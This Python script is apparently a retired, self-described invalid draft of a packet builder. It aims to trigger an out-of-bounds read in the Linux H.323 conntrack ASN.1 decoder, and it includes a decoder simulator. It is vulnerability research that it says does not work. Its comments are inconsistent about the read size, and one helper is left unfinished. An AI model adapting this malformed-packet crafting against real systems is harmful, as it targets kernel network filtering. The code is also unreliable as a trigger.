#!/usr/bin/env python3
"""RETIRED: historical, invalid H.245 CONS trigger draft.

This file must not be used to claim or exercise the live decode_int() CONS
target. Exact Linux v4.19.235 tables mark the H.245 videoBitRate field as
SKIP, so decode_int() does not read it. In addition, this builder wraps its
H.245 content in ReleaseComplete, which does not cause process_setup() to
parse h245Control. The advertised OOB path is therefore unreachable through
these packets. The valid active CONS targets found so far are RAS TTL fields;
see h323_ras_cons_trigger.py.

The implementation below is retained only as the historical draft for
reviewing the original mistake. Running it will not build or print packets.

Original hypothesis (refuted; upstream fix 1e3a3593162c96e8):

decode_int() CONS case in nf_conntrack_h323_asn1.c (4.19.235):
    len = get_bits(bs, 2) + 1;     /* 1..4  */
    /* upstream fix adds: if (nf_h323_error_boundary(bs, len, 0)) return BOUND; */
    BYTE_ALIGN(bs); ...
    v = get_uint(bs, len);         /* reads 1..4 bytes with NO bounds check */
    bs->cur += len;

Trigger path (all tables from the shipped nf_conntrack_h323_types.c):
  RasMessage/Q.931 SETUP -> UUIE H323-UserInformation -> H323-UU-PDU
  (ext=1, ext bitmap bit for h245Control) -> h245Control SEQOF ->
  MultimediaSystemControlMessage CHOICE (request) -> openLogicalChannel ->
  forwardLogicalChannelParameters -> dataType CHOICE (videoData) ->
  videoCapability CHOICE (h262VideoCapability) -> videoBitRate INT CONS
  at the very end of the packet: get_uint reads past the buffer.

Three packets:
  A  CallProceeding UUIE with h245Address  -> oracle: h245 expectation (4444)
  B  full valid OLC, CONS in-bounds         -> oracle: rtp/rtcp expectations
                                              (5555/5556)
  T  same as B truncated right after the 2-bit CONS length field (=3), so
     len = field + 1 = 4; get_uint reads 4 bytes past the end -> OOB read; decode then fails
     cleanly (BOUND) -> no expectations, no crash expected.
"""

class BW:
    def __init__(self):
        self.bits = []
    def bit(self, b):
        self.bits.append(1 if b else 0)
    def bits_msb(self, value, n):
        for i in range(n - 1, -1, -1):
            self.bits.append((value >> i) & 1)
    def align(self):
        while len(self.bits) % 8:
            self.bits.append(0)
    def bytes_(self, bs):
        self.align()
        for b in bs:
            self.bits_msb(b, 8)
    def pack(self, tail_pad=0):
        self.align()
        by = bytearray()
        for i in range(0, len(self.bits), 8):
            v = 0
            for b in self.bits[i:i + 8]:
                v = (v << 1) | b
            by.append(v)
        by += b"\x00" * tail_pad
        return bytes(by)


def uu_pdu_common(w, body_index_3bit, body_builder):
    """UserInformation -> UU_PDU -> msg-body -> body."""
    w.bit(0)                      # H323-UserInformation ext
    w.bits_msb(0, 1)               # user-data optional absent
    w.bit(0)                       # H323-UU-PDU ext?  -- NO: ext set by caller
    # (caller sets UU_PDU ext bit before calling; see below)


def wrap_tpkt(q931_payload, msgtype=0x05):
    """Wrap H.323 UserInformation for this kernel's Q.931 decoder.

    The shipped nf_conntrack_h323 DecodeQ931 reads the User-user IE length as
    a big-endian 16-bit value (a nonstandard divergence from Q.931), then
    skips the 0x05 user-user protocol discriminator before decoding PER.
    """
    body = bytes([0x08, 0x00, msgtype, 0x7e]) + \
        (1 + len(q931_payload)).to_bytes(2, "big") + b"\x05" + q931_payload
    return bytes([0x03, 0x00]) + (4 + len(body)).to_bytes(2, "big") + body


# ---------------- Oracle A: CallProceeding + h245Address ----------------

def build_oracle_a(ip=b"\xc0\xa8\x01\x96", port=4444):
    w = BW()
    # H323-UserInformation SEQ {sz=1, lb=2, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 1)               # user-data absent
    # H323-UU-PDU SEQ {sz=1, lb=2, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 1)               # nonStandardData absent
    # h323-message-body CHOICE {sz=3, lb=7, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(1, 3)               # index 1 = callProceeding
    # CallProceeding-UUIe SEQ {sz=2, lb=5, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0b10, 2)            # first optional = h245Address (MSB first)
    # protocolIdentifier OID (BYTE): align + len + bytes
    w.bytes_(bytes([6]) + b"\x00" * 6)
    # h245Address CHOICE {sz=3, lb=7, EXT} over _TransportAddress
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 3)               # index 0 = unicastAddress
    # _UnicastAddress CHOICE {sz=3, lb=5, ub=7, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 3)               # index 0 = iPAddress
    # _UnicastAddress_iPAddress SEQ {sz=0, lb=2, DECODE}: no ext, no bitmap
    w.bytes_(ip + port.to_bytes(2, "big"))
    # callIdentifier SEQ {sz=0, lb=1, EXT}
    w.bit(0)                       # ext = 0
    w.bytes_(b"\x00" * 16)         # guid OCTSTR FIXD 16
    return w.pack()


# ---------------- Oracle B / Trigger: h245Control valid OLC ----------------

def build_mscm_olc(w, video_bit_rate_byte=0x40, truncated_at_cons=False,
                   cons_len_field=3):
    """Append MSCM(->request->openLogicalChannel) content bits.
    If truncated_at_cons: stop right after the CONS 2-bit length field."""
    # MultimediaSystemControlMessage CHOICE {sz=2, lb=4, OPEN|EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 2)               # index 0 = request
    # RequestMessage CHOICE {sz=4, lb=11, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(3, 4)               # index 3 = openLogicalChannel
    # OpenLogicalChannel SEQ {sz=1, lb=3, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 1)               # reverseLogicalChannelParameters absent
    # forwardLogicalChannelNumber INT WORD
    w.bytes_(bytes([0x00, 0x64]))
    # forwardLogicalChannelParameters SEQ {sz=1, lb=3, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 1)               # portNumber absent
    # dataType CHOICE {sz=3, lb=6, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(2, 3)               # index 2 = videoData
    # VideoCapability CHOICE {sz=3, lb=5, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(1, 3)               # index 1 = h262VideoCapability
    # H262VideoCapability SEQ {sz=6, lb=17, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0b100000, 6)        # bmp: videoBitRate present
    w.bits_msb(0, 11)              # 11 profileAndLevel BOOLs
    # videoBitRate INT CONS {SKIP|OPT, present}
    w.bits_msb(cons_len_field, 2)  # len = field + 1 (3 -> 3 bytes)
    if truncated_at_cons:
        return                    # packet ends here: get_uint reads 3B OOB
    w.bytes_(bytes([video_bit_rate_byte]))
    # multiplexParameters CHOICE {sz=2, lb=3, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(3, 2)               # index 3 = h2250LogicalChannelParameters
    # H2250LogicalChannelParameters SEQ {sz=10, lb=11, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0b0010100000, 10)   # mediaChannel(bit2), mediaControlChannel(bit4)
    w.bytes_(bytes([0x01]))       # sessionID INT BYTE
    # mediaChannel CHOICE {sz=1, lb=2, EXT}
    w.bit(0); w.bits_msb(0, 1)     # unicastAddress
    # UnicastAddress CHOICE {sz=3, lb=5, EXT}
    w.bit(0); w.bits_msb(0, 3)     # iPAddress
    # UnicastAddress_iPAddress SEQ {sz=0, lb=2, DECODE}
    w.bytes_(b"\xc0\xa8\x01\x96" + (5555).to_bytes(2, "big"))
    # mediaControlChannel CHOICE (same shape)
    w.bit(0); w.bits_msb(0, 1)
    w.bit(0); w.bits_msb(0, 3)
    w.bytes_(b"\xc0\xa8\x01\x96" + (5556).to_bytes(2, "big"))
    # child[6] mediaControlGuaranteedDelivery STOP: decode ends cleanly here


def build_oracle_b():
    w = BW()
    w.bit(0)                       # H323-UserInformation ext
    w.bits_msb(0, 1)               # user-data absent
    w.bit(1)                       # H323-UU-PDU ext = 1
    w.bits_msb(0, 1)               # nonStandardData absent
    w.bit(0)                       # msg-body ext
    w.bits_msb(5, 3)               # index 5 = releaseComplete (cheapest body)
    # ReleaseComplete-UUIe SEQ {sz=1, lb=2, EXT}
    w.bit(0)                       # ext = 0
    w.bits_msb(0, 1)               # reason absent
    w.bytes_(bytes([6]) + b"\x00" * 6)   # protocolIdentifier OID
    # UU_PDU extension block
    w.bits_msb(2, 7)               # bmp2_len - 1 = 2 -> 3 bits
    w.bits_msb(0b001, 3)           # third extension = h245Control
    w.align()
    # h245Control ext component: get_len prefix, then SEQOF content
    seqof_bits_placeholder = None
    # build inner SEQOF content first to size the prefix
    inner = BW()
    inner.bytes_(bytes([1]))       # SEQOF count = get_len + 0 -> 1 item
    inner.align()
    mscm = BW()
    build_mscm_olc(mscm, truncated_at_cons=False, cons_len_field=0)
    mscm_bytes = mscm.pack()
    # item: OPEN -> BYTE_ALIGN + get_len prefix
    item_prefix_len = 1            # get_len 1 byte (len < 0x80)
    # inner content = [count byte][item: prefix][mscm bytes]
    seqof_len = 1 + 1 + len(mscm_bytes)
    w.bytes_(bytes([seqof_len]))   # h245Control ext component length
    w.bytes_(bytes([1]))           # SEQOF count = 1
    w.bytes_(bytes([len(mscm_bytes)]))  # item OPEN length prefix
    for b in mscm_bytes:
        w.bytes_(bytes([b]))
    return w.pack()


def build_trigger():
    w = BW()
    w.bit(0)                       # H323-UserInformation ext
    w.bits_msb(0, 1)               # user-data absent
    w.bit(1)                       # H323-UU-PDU ext = 1
    w.bits_msb(0, 1)               # nonStandardData absent
    w.bit(0)                       # msg-body ext
    w.bits_msb(5, 3)               # releaseComplete
    w.bit(0)                       # ReleaseComplete ext
    w.bits_msb(0, 1)               # reason absent
    w.bytes_(bytes([6]) + b"\x00" * 6)   # protocolIdentifier OID
    w.bits_msb(2, 7)               # bmp2_len - 1 = 2
    w.bits_msb(0b001, 3)           # third extension = h245Control
    w.align()
    mscm = BW()
    build_mscm_olc(mscm, truncated_at_cons=True, cons_len_field=3)
    mscm_bytes = mscm.pack()
    seqof_len = 1 + 1 + len(mscm_bytes)
    w.bytes_(bytes([seqof_len]))
    w.bytes_(bytes([1]))           # SEQOF count
    w.bytes_(bytes([len(mscm_bytes)]))
    for b in mscm_bytes:
        w.bytes_(bytes([b]))
    return w.pack()                # no tail padding: packet ends at the CONS bits


# ---------------- Kernel-mirror simulator ----------------

class Sim:
    def __init__(self, buf):
        self.buf, self.cur, self.bit, self.n = buf, 0, 0, len(buf)
    def gb(self, n):               # get_bits MSB-first
        v = 0
        for _ in range(n):
            if self.cur >= self.n:
                raise AssertionError("get_bits read past end")
            v = (v << 1) | ((self.buf[self.cur] >> (7 - self.bit)) & 1)
            self.bit += 1
            if self.bit > 7:
                self.cur += 1; self.bit = 0
        return v
    def align(self):
        if self.bit:
            self.cur += 1; self.bit = 0
    def skip(self, n):
        self.align()
        if self.cur + n > self.n:
            raise AssertionError("aligned skip past end")
        self.cur += n
    def glen(self):                # get_len (aligned caller)
        self.align()
        v = self.buf[self.cur]; self.cur += 1
        if v & 0x80:
            v = (v & 0x3f) << 8
            v += self.buf[self.cur]; self.cur += 1
        return v


def simulate_oracle_a(buf):
    s = Sim(buf)
    assert s.gb(1) == 0            # UserInf ext
    assert s.gb(1) == 0            # user-data absent
    assert s.gb(1) == 0            # UU_PDU ext
    assert s.gb(1) == 0            # nonStandardData absent
    assert s.gb(1) == 0            # msg-body ext
    assert s.gb(3) == 1            # callProceeding
    assert s.gb(1) == 0            # CallProc ext
    bmp = s.gb(2)
    assert bmp == 0b10, bin(bmp)   # first optional, h245Address, present
    s.skip(1); s.skip(6)           # protocolIdentifier OID
    assert s.gb(1) == 0            # h245Address ext
    assert s.gb(3) == 0            # unicastAddress
    assert s.gb(1) == 0            # _UnicastAddress ext
    assert s.gb(3) == 0            # iPAddress
    s.align()
    ip = buf[s.cur:s.cur+4]; s.cur += 4
    port = int.from_bytes(buf[s.cur:s.cur+2], "big"); s.cur += 2
    assert s.gb(1) == 0            # callIdentifier ext
    s.skip(16)                     # guid
    assert s.cur == s.n, (s.cur, s.n)
    return f"ok: h245Address {ip.hex()}:{port}"


def _walk_mscm(s, truncated):
    assert s.gb(1) == 0            # MSCM ext
    assert s.gb(2) == 0            # request
    assert s.gb(1) == 0            # RequestMessage ext
    assert s.gb(4) == 3            # openLogicalChannel
    assert s.gb(1) == 0            # OLC ext
    assert s.gb(1) == 0            # reverse absent
    s.skip(2)                      # forwardLogicalChannelNumber WORD
    assert s.gb(1) == 0            # fwdParams ext
    assert s.gb(1) == 0            # portNumber absent
    assert s.gb(1) == 0            # dataType ext
    assert s.gb(3) == 2            # videoData
    assert s.gb(1) == 0            # VideoCapability ext
    assert s.gb(3) == 1            # h262VideoCapability
    assert s.gb(1) == 0            # H262 ext
    assert s.gb(6) == 0b100000     # videoBitRate present
    s.gb(11)                       # 11 BOOLs
    cons_len = s.gb(2) + 1         # CONS length field -> len
    if truncated:
        s.align()
        oob_start = s.cur
        # kernel get_uint reads cons_len bytes with NO bounds check
        read_end = s.cur + cons_len
        assert read_end > s.n, "not actually OOB"
        return f"ok: CONS len={cons_len}, get_uint reads bytes {oob_start}..{read_end} " \
               f"({read_end - s.n} past end of {s.n})"
    s.skip(cons_len)               # get_uint in-bounds
    assert s.gb(1) == 0            # multiplexParameters ext
    assert s.gb(2) == 3            # h2250LogicalChannelParameters
    assert s.gb(1) == 0            # H2250 ext
    assert s.gb(10) == 0b0010100000  # mediaChannel + mediaControlChannel
    s.skip(1)                      # sessionID
    for expect_port in (5555, 5556):
        assert s.gb(1) == 0        # unicastAddress
        assert s.gb(1) == 0        # UnicastAddress ext
        assert s.gb(3) == 0        # iPAddress
        s.align()
        ip = s.buf[s.cur:s.cur+4]; s.cur += 4
        port = int.from_bytes(s.buf[s.cur:s.cur+2], "big"); s.cur += 2
        assert port == expect_port, (port, expect_port)
    # child[6] STOP ends the decode cleanly; nothing more is read
    return "ok: full OLC decoded; decode ends at mediaControlGuaranteedDelivery STOP"


def simulate_oracle_b(buf):
    s = Sim(buf)
    assert s.gb(1) == 0            # UserInf ext
    assert s.gb(1) == 0            # user-data absent
    assert s.gb(1) == 1            # UU_PDU ext = 1
    assert s.gb(1) == 0            # nonStandardData absent
    assert s.gb(1) == 0            # msg-body ext
    assert s.gb(3) == 5            # releaseComplete
    assert s.gb(1) == 0            # ReleaseComplete ext
    assert s.gb(1) == 0            # reason absent
    s.skip(1); s.skip(6)           # protocolIdentifier OID
    assert s.gb(7) + 1 == 3        # bmp2_len
    assert s.gb(3) == 0b001        # third extension = h245Control
    s.align()
    ext_len = s.glen()
    assert ext_len == s.n - s.cur, (ext_len, s.n - s.cur)  # covers rest
    count = s.glen()
    assert count == 1
    item_len = s.glen()
    assert item_len == s.n - s.cur
    r = _walk_mscm(s, truncated=False)
    return r


def simulate_trigger(buf):
    s = Sim(buf)
    assert s.gb(1) == 0
    assert s.gb(1) == 0
    assert s.gb(1) == 1
    assert s.gb(1) == 0
    assert s.gb(1) == 0
    assert s.gb(3) == 5
    assert s.gb(1) == 0
    assert s.gb(1) == 0
    s.skip(1); s.skip(6)
    assert s.gb(7) + 1 == 3
    assert s.gb(3) == 0b001
    s.align()
    s.glen()                       # ext component len
    assert s.glen() == 1           # SEQOF count
    s.glen()                       # item len
    return _walk_mscm(s, truncated=True)


if __name__ == "__main__":
    raise SystemExit(
        "Retired draft: exact v4.19.235 tables mark videoBitRate CONS as "
        "SKIP, and these packets do not enter process_h245. Use the RAS "
        "builder for the currently verified target path."
    )
